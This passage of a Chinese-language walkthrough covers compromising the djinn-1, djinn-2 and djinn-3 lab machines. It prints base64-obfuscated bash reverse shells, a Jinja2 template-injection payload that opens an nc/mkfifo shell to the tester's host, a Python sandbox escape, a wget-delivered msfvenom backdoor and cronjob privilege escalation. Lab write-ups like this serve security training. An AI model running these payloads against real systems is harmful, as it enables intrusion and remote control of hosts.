alt=\"\"></p>\n<p>cred.txt得知存在nitu用户</p>\n<p>game.txt说1337端口有个游戏，直接访问不到，nc成功连接是个计算的小游戏</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030200201.png\" alt=\"\"></p>\n<p>message.txt是个留言</p>\n<h3 id=\"端口敲门\"><a href=\"#端口敲门\" class=\"headerlink\" title=\"端口敲门\"></a>端口敲门</h3><p>game.txt提示回答一千次答案就有礼物，那么利用pwntools写个脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">result</span><span class=\"params\">(raw1,raw2,raw3)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> raw2 == <span class=\"string\">'+'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> int(raw3+raw1)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> raw2 == <span class=\"string\">'-'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> int(raw3-raw1)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> raw2 == <span class=\"string\">'*'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> int(raw3*raw1)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> raw2 == <span class=\"string\">'/'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> int(raw3/raw1)</span><br><span class=\"line\"></span><br><span class=\"line\">s = remote(<span class=\"string\">'192.168.119.136'</span>,<span class=\"string\">'1337'</span>)</span><br><span class=\"line\">res = s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()</span><br><span class=\"line\">res2 = str(res,encoding=<span class=\"string\">'UTF-8'</span>)</span><br><span class=\"line\">res3 = list(res2)</span><br><span class=\"line\">raw1 = int(res3[<span class=\"number\">-3</span>])</span><br><span class=\"line\">raw2 = res3[<span class=\"number\">-7</span>]</span><br><span class=\"line\">raw3 = int(res3[<span class=\"number\">-11</span>])</span><br><span class=\"line\">re = result(raw1,raw2,raw3)</span><br><span class=\"line\">print(raw1,raw2,raw3)</span><br><span class=\"line\">print(re)</span><br><span class=\"line\">s.sendline(str(re))</span><br><span class=\"line\">i=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span>(<span class=\"number\">1</span>):</span><br><span class=\"line\">    i+=<span class=\"number\">1</span></span><br><span class=\"line\">    print(<span class=\"string\">'第'</span>+str(i)+<span class=\"string\">'次'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i&gt;<span class=\"number\">1000</span>:</span><br><span class=\"line\">        print(s.recvline()+s.recvline()+s.recvline())</span><br><span class=\"line\">        exit(<span class=\"number\">1</span>)</span><br><span class=\"line\">    res4=s.recvline()</span><br><span class=\"line\">    print(res4)</span><br><span class=\"line\">    res5 = str(res4,encoding=<span class=\"string\">'UTF-8'</span>)</span><br><span class=\"line\">    res6 = list(res5)</span><br><span class=\"line\">    raw4 = int(res6[<span class=\"number\">-3</span>])</span><br><span class=\"line\">    raw5 = res6[<span class=\"number\">-7</span>]</span><br><span class=\"line\">    raw6 = int(res6[<span class=\"number\">-11</span>])</span><br><span class=\"line\">    re2 = result(raw4,raw5,raw6)</span><br><span class=\"line\">    print(re2)</span><br><span class=\"line\">    s.sendline(str(re2))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031155255.png\" alt=\"\"></p>\n<p>给了三个数字，猜测可能是三个端口号，想起了之前的端口敲门服务，试一下</p>\n<p>现在的ssh是不可访问的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031155434.png\" alt=\"\"></p>\n<p>依次‘敲’1356，6784，3409，可能失败，多敲几次就开了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031161505.png\" alt=\"\"></p>\n<h3 id=\"ssh登录\"><a href=\"#ssh登录\" class=\"headerlink\" title=\"ssh登录\"></a>ssh登录</h3><p>现在只知道有个nitu用户，但没有密码无法登录，继续看另一条线，之前扫目录得到的wish</p>\n<p>访问有个命令框，扫出个命令执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031162815.png\" alt=\"\"></p>\n<p>测试一下，输入ls，跟随跳转是可以看到回显的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031163739.png\" alt=\"\"></p>\n<p>那么试试nc连接shell</p>\n<p>显示</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031163934.png\" alt=\"\"></p>\n<p>bash同样回显，可能过滤了/bin/sh字符</p>\n<p>那么把payload base64转换处理试试</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031171146.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo &quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExOS4xMjgvOTk5OSAwPiYxCg&#x3D;&#x3D;&quot; | base64 -d | bash</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031171128.png\" alt=\"\"></p>\n<p>在.dev目录下找到nitish用户的密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031185747.png\" alt=\"\"></p>\n<p>sudo -l得知genie命令免密</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031190010.png\" alt=\"\"></p>\n<h3 id=\"python沙箱逃逸提权\"><a href=\"#python沙箱逃逸提权\" class=\"headerlink\" title=\"python沙箱逃逸提权\"></a>python沙箱逃逸提权</h3><p>查看帮助</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031192239.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031192837.png\" alt=\"\"></p>\n<p>有两个貌似可以执行命令的参数，试一下</p>\n<p>直接进来了。。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031192949.png\" alt=\"\"></p>\n<p>继续</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031193228.png\" alt=\"\"></p>\n<p>又是个奇怪的游戏</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031193643.png\" alt=\"\"></p>\n<p>退出的时候看着像python，试试沙箱逃逸</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">__import__(&quot;os&quot;).system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201101222613.png\" alt=\"\"></p>\n<p>那么直接</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">__import__(&quot;os&quot;).system(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201101224321.png\" alt=\"\"></p>\n<p>root目录下通关信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201101224718.png\" alt=\"\"></p>\n<h2 id=\"djinn-2\"><a href=\"#djinn-2\" class=\"headerlink\" title=\"djinn-2\"></a>djinn-2</h2><h3 id=\"信息搜集-1\"><a href=\"#信息搜集-1\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111084118.png\" alt=\"\"></p>\n<p>ftp可以匿名登录，查看目录下还是有三个文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111084611.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111084636.png\" alt=\"\"></p>\n<p>nitu用户仍然存在，并且说时解雇了sam并且雇佣了一个新的成员ugtan</p>\n<p>1337端口nc连接又是一个小游戏，但这里回答两次就给一句名人名言</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111214525.png\" alt=\"\"></p>\n<p>5000端口服务不接受get请求，但post上去显示访问拒绝<img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111085759.png\" alt=\"\"></p>\n<p>7331端口依旧是静态界面</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111085859.png\" alt=\"\"></p>\n<p>扫目录结果如下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111090608.png\" alt=\"\"></p>\n<p>robots.txt</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111090710.png\" alt=\"\"></p>\n<p>source文件下载打开</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import re</span><br><span class=\"line\">from time import sleep</span><br><span class=\"line\">import requests</span><br><span class=\"line\">URL &#x3D; &quot;http:&#x2F;&#x2F;&#123;&#125;:5000&#x2F;?username&#x3D;&#123;&#125;&amp;password&#x3D;&#123;&#125;&quot;</span><br><span class=\"line\">def check_ip(ip: str):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    Check whether the input IP is valid or not</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    if re.match(r&#39;^(?:(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])&#39;</span><br><span class=\"line\">                &#39;(\\.(?!$)|$))&#123;4&#125;$&#39;, ip):</span><br><span class=\"line\">        return True</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return False</span><br><span class=\"line\">def catcher(host, username, password):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        url &#x3D; URL.format(host, username, password)</span><br><span class=\"line\">        requests.post(url)</span><br><span class=\"line\">        sleep(3)</span><br><span class=\"line\">    except Exception:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">    print(&quot;Unable to connect to the server!!&quot;)</span><br><span class=\"line\">def main():</span><br><span class=\"line\">    print(&quot;If you have this then congratulations on being a part of an awesome organization&quot;)</span><br><span class=\"line\">    print(&quot;This key will help you in connecting to our system securely.&quot;)</span><br><span class=\"line\">    print(&quot;If you find any issue please report it to ugtan@djinn.io&quot;)</span><br><span class=\"line\">    ip &#x3D; input(&#39;\\nIP of the machine: &#39;)</span><br><span class=\"line\">    username &#x3D; input(&#39;Your username: &#39;)</span><br><span class=\"line\">    password &#x3D; input(&#39;Your password: &#39;)</span><br><span class=\"line\">    if ip and check_ip(ip) and username &#x3D;&#x3D; &quot;REDACTED&quot; and password &#x3D;&#x3D; &quot;REDACTED&quot;:</span><br><span class=\"line\">        print(&quot;Verifiying %s with host %s &quot; % (username, ip))</span><br><span class=\"line\">        catcher(ip, username, password)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&quot;Invalid IP address given&quot;)</span><br><span class=\"line\">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>发现是5000端口服务的登录方式，这时xray也扫到了5000端口登录的命令注入</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111092456.png\" alt=\"\"></p>\n<p>但依旧是过滤了bash和nc等等，之前的base64方式也用不了了</p>\n<p>wish目录下仍然是个对话框，但就像他说的，命令注入已经修复</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201111211645.png\" alt=\"\"></p>\n<h3 id=\"Getshell\"><a href=\"#Getshell\" class=\"headerlink\" title=\"Getshell\"></a>Getshell</h3><p>感觉突破口就只剩下5000端口的rce了，之前已经测试发现过滤了很多东西，查看下具体</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113163614.png\" alt=\"\"></p>\n<p>直接弹不了shell，但这里注意到靶机的wget是可以用的，那么我们可以利用生成后门，远程下载之后在靶机上执行</p>\n<p>msfvenom生成linux可执行文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113170317.png\" alt=\"\"></p>\n<p>本地python启一个http服务，靶机上wget下载到tmp目录，<code>chmod 777 /tmp/hack.elf</code>赋予执行权限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113170436.png\" alt=\"\"></p>\n<p>本地msf准备监听</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113170539.png\" alt=\"\"></p>\n<p>执行exploit，burp执行<code>/tmp/hack.elf</code></p>\n<p>可以看到已经成功得到session</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113171056.png\" alt=\"\"></p>\n<p>python用不了直接nc或者bash弹出来</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113171353.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113171427.png\" alt=\"\"></p>\n<p>backups目录下除了一堆备份文件还找到一个kdbx文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113183429.png\" alt=\"\"></p>\n<p>baidu一下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113183618.png\" alt=\"\"></p>\n<p>说是可以用keepass打开，nc把文件传出来，windows下keepass下打开看看</p>\n<p>但是需要一个密码才能打开这个文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113184234.png\" alt=\"\"></p>\n<p>正好之前的creds.txt里有一串字符串</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113184317.png\" alt=\"\"></p>\n<p>输进去看看，成功，点击general，右键复制密码成功得到nitish用户的密码<code>&amp;HtMGd$LJB</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113184444.png\" alt=\"\"></p>\n<h3 id=\"命令注入\"><a href=\"#命令注入\" class=\"headerlink\" title=\"命令注入\"></a>命令注入</h3><p>那么切换nitu用户，但权限不足无法直接切换，ssh连接成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113185205.png\" alt=\"\"></p>\n<p>一番寻找无果，查看端口进程发现2843端口一直在监听本地地址</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113185913.png\" alt=\"\"></p>\n<p>有一些功能</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113190209.png\" alt=\"\"></p>\n<p>1，3展示，2没权限，4原样输入和展示，5可以添加给6查看</p>\n<p>但第6个选项注意到它在读取之前是会进行一项cat操作的，并且对象是通过5添加的文件名</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113190355.png\" alt=\"\"></p>\n<p>我们添加一个etc/passwd试试</p>\n<p>成功读取</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113190836.png\" alt=\"\"></p>\n<p>因此我们知道这里存在一个命令执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113190947.png\" alt=\"\"></p>\n<p>那么试着反弹shell</p>\n<p>bash和nc都失败</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113191217.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113191237.png\" alt=\"\"></p>\n<p>base64成功反弹shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExOC4xMDgvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113191912.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113191940.png\" alt=\"\"></p>\n<h3 id=\"cronjob提权\"><a href=\"#cronjob提权\" class=\"headerlink\" title=\"cronjob提权\"></a>cronjob提权</h3><p>/var/mail目录下有封邮件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113192531.png\" alt=\"\"></p>\n<p>告诉说他已经在家目录里面创建好了目录，应该是这</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113193852.png\" alt=\"\"></p>\n<p>说你可以创建一个clean.sh并且cronjob会自动提交任务执行，那么写入bash，监听端口等待执行即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113194332.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113194600.png\" alt=\"\"></p>\n<p>成功获取root权限，完成</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201113194742.png\" alt=\"\"></p>\n<h2 id=\"djinn-3\"><a href=\"#djinn-3\" class=\"headerlink\" title=\"djinn-3\"></a>djinn-3</h2><h3 id=\"信息搜集-2\"><a href=\"#信息搜集-2\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><p>端口开放及服务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-11-18 05:50 EST</span><br><span class=\"line\">Nmap scan report for 192.168.117.40</span><br><span class=\"line\">Host is up (0.00016s latency).</span><br><span class=\"line\">Not shown: 65532 closed ports</span><br><span class=\"line\">PORT      STATE SERVICE</span><br><span class=\"line\">22&#x2F;tcp    open  ssh</span><br><span class=\"line\">80&#x2F;tcp    open  http</span><br><span class=\"line\">5000&#x2F;tcp  open  upnp</span><br><span class=\"line\">31337&#x2F;tcp open  Elite</span><br><span class=\"line\">MAC Address: 00:0C:29:66:A8:11 (VMware)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 3.62 seconds</span><br></pre></td></tr></table></figure>\n\n<p>80端口</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118185159.png\" alt=\"\"></p>\n<p>目录扫描无结果</p>\n<p>5000端口</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118185457.png\" alt=\"\"></p>\n<p>点击link</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118185701.png\" alt=\"\"></p>\n<p>对id参数测试无结果</p>\n<p>31337端口需要登录认证</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118190637.png\" alt=\"\"></p>\n<h3 id=\"Getshell-1\"><a href=\"#Getshell-1\" class=\"headerlink\" title=\"Getshell\"></a>Getshell</h3><p>观察5000端口页面信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118191111.png\" alt=\"\"></p>\n<p>提到存在一个guest用户，登录试试</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118191259.png\" alt=\"\"></p>\n<p>发现利用open命令新建一个ticket会直接显示在5000端口的页面</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118191721.png\" alt=\"\"></p>\n<p>试试命令注入，插入php代码和命令均无果</p>\n<p>翻回去看，信息搜集没做好，nmap没探测清楚5000端口的命令，重新探测</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-11-18 06:25 EST</span><br><span class=\"line\">Nmap scan report for 192.168.117.40</span><br><span class=\"line\">Host is up (0.00044s latency).</span><br><span class=\"line\">Not shown: 65531 closed ports</span><br><span class=\"line\">PORT      STATE SERVICE VERSION</span><br><span class=\"line\">22&#x2F;tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">| ssh-hostkey: </span><br><span class=\"line\">|   2048 e6:44:23:ac:b2:d9:82:e7:90:58:15:5e:40:23:ed:65 (RSA)</span><br><span class=\"line\">|   256 ae:04:85:6e:cb:10:4f:55:4a:ad:96:9e:f2:ce:18:4f (ECDSA)</span><br><span class=\"line\">|_  256 f7:08:56:19:97:b5:03:10:18:66:7e:7d:2e:0a:47:42 (ED25519)</span><br><span class=\"line\">80&#x2F;tcp    open  http    lighttpd 1.4.45</span><br><span class=\"line\">|_http-server-header: lighttpd&#x2F;1.4.45</span><br><span class=\"line\">|_http-title: Custom-ers</span><br><span class=\"line\">5000&#x2F;tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)</span><br><span class=\"line\">|_http-server-header: Werkzeug&#x2F;1.0.1 Python&#x2F;3.6.9</span><br><span class=\"line\">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;utf-8).</span><br><span class=\"line\">31337&#x2F;tcp open  Elite?</span><br><span class=\"line\">| fingerprint-strings: </span><br><span class=\"line\">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL: </span><br><span class=\"line\">|     username&gt;</span><br><span class=\"line\">|   GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: </span><br><span class=\"line\">|     username&gt; password&gt; authentication failed</span><br><span class=\"line\">|   Help: </span><br><span class=\"line\">|     username&gt; password&gt;</span><br><span class=\"line\">|   RPCCheck: </span><br><span class=\"line\">|     username&gt; Traceback (most recent call last):</span><br><span class=\"line\">|     File &quot;&#x2F;opt&#x2F;.tick-serv&#x2F;tickets.py&quot;, line 105, in &lt;module&gt;</span><br><span class=\"line\">|     main()</span><br><span class=\"line\">|     File &quot;&#x2F;opt&#x2F;.tick-serv&#x2F;tickets.py&quot;, line 93, in main</span><br><span class=\"line\">|     username &#x3D; input(&quot;username&gt; &quot;)</span><br><span class=\"line\">|     File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;codecs.py&quot;, line 321, in decode</span><br><span class=\"line\">|     (result, consumed) &#x3D; self._buffer_decode(data, self.errors, final)</span><br><span class=\"line\">|     UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0x80 in position 0: invalid start byte</span><br><span class=\"line\">|   SSLSessionReq: </span><br><span class=\"line\">|     username&gt; Traceback (most recent call last):</span><br><span class=\"line\">|     File &quot;&#x2F;opt&#x2F;.tick-serv&#x2F;tickets.py&quot;, line 105, in &lt;module&gt;</span><br><span class=\"line\">|     main()</span><br><span class=\"line\">|     File &quot;&#x2F;opt&#x2F;.tick-serv&#x2F;tickets.py&quot;, line 93, in main</span><br><span class=\"line\">|     username &#x3D; input(&quot;username&gt; &quot;)</span><br><span class=\"line\">|     File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;codecs.py&quot;, line 321, in decode</span><br><span class=\"line\">|     (result, consumed) &#x3D; self._buffer_decode(data, self.errors, final)</span><br><span class=\"line\">|     UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0xd7 in position 13: invalid continuation byte</span><br><span class=\"line\">|   TerminalServerCookie: </span><br><span class=\"line\">|     username&gt; Traceback (most recent call last):</span><br><span class=\"line\">|     File &quot;&#x2F;opt&#x2F;.tick-serv&#x2F;tickets.py&quot;, line 105, in &lt;module&gt;</span><br><span class=\"line\">|     main()</span><br><span class=\"line\">|     File &quot;&#x2F;opt&#x2F;.tick-serv&#x2F;tickets.py&quot;, line 93, in main</span><br><span class=\"line\">|     username &#x3D; input(&quot;username&gt; &quot;)</span><br><span class=\"line\">|     File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;codecs.py&quot;, line 321, in decode</span><br><span class=\"line\">|     (result, consumed) &#x3D; self._buffer_decode(data, self.errors, final)</span><br><span class=\"line\">|_    UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0xe0 in position 5: invalid continuation byte</span><br></pre></td></tr></table></figure>\n\n<p>编程语言是python，会将输入的信息显示到网页，考虑ssti模板注入</p>\n<p>open创建一个测试ticket</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118193246.png\" alt=\"\"></p>\n<p>成功回显</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118193312.png\" alt=\"\"></p>\n<p>那么利用ssti命令执行</p>\n<p>payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118195456.png\" alt=\"\"></p>\n<p>那么弹个shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.118.104 8888 &gt;&#x2F;tmp&#x2F;f&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118195735.png\" alt=\"\"></p>\n<h3 id=\"ssh免密登录\"><a href=\"#ssh免密登录\" class=\"headerlink\" title=\"ssh免密登录\"></a>ssh免密登录</h3><p>home用户下存在三个用户</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118202611.png\" alt=\"\"></p>\n<p>发现opt目录下还有两个pyc文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118203912.png\" alt=\"\"></p>\n<p>下载下来反编译看看</p>\n<p>.configuration.cpython-38.pyc</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os, sys, json</span><br><span class=\"line\"><span class=\"keyword\">from</span> glob <span class=\"keyword\">import</span> glob</span><br><span class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime <span class=\"keyword\">as</span> dt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ConfigReader</span>:</span></span><br><span class=\"line\">    config = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">    @staticmethod</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">read_config</span><span class=\"params\">(path)</span>:</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"Reads the config file</span></span><br><span class=\"line\"><span class=\"string\">        \"\"\"</span></span><br><span class=\"line\">        config_values = &#123;&#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"keyword\">with</span> open(path, <span class=\"string\">'r'</span>) <span class=\"keyword\">as</span> (f):</span><br><span class=\"line\">                config_values = json.load(f)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                print(<span class=\"string\">\"Couldn't properly parse the config file. Please use properl\"</span>)</span><br><span class=\"line\">                sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">                e = <span class=\"literal\">None</span></span><br><span class=\"line\">                <span class=\"keyword\">del</span> e</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> config_values</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">    @staticmethod</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">set_config_path</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"Set the config path</span></span><br><span class=\"line\"><span class=\"string\">        \"\"\"</span></span><br><span class=\"line\">        files = glob(<span class=\"string\">'/home/saint/*.json'</span>)</span><br><span class=\"line\">        other_files = glob(<span class=\"string\">'/tmp/*.json'</span>)</span><br><span class=\"line\">        files = files + other_files</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> len(files) &gt; <span class=\"number\">2</span>:</span><br><span class=\"line\">                files = files[:<span class=\"number\">2</span>]</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                file1 = os.path.basename(files[<span class=\"number\">0</span>]).split(<span class=\"string\">'.'</span>)</span><br><span class=\"line\">                file2 = os.path.basename(files[<span class=\"number\">1</span>]).split(<span class=\"string\">'.'</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> file1[(<span class=\"number\">-2</span>)] == <span class=\"string\">'config'</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> file2[(<span class=\"number\">-2</span>)] == <span class=\"string\">'config'</span>:</span><br><span class=\"line\">                        a = dt.strptime(file1[<span class=\"number\">0</span>], <span 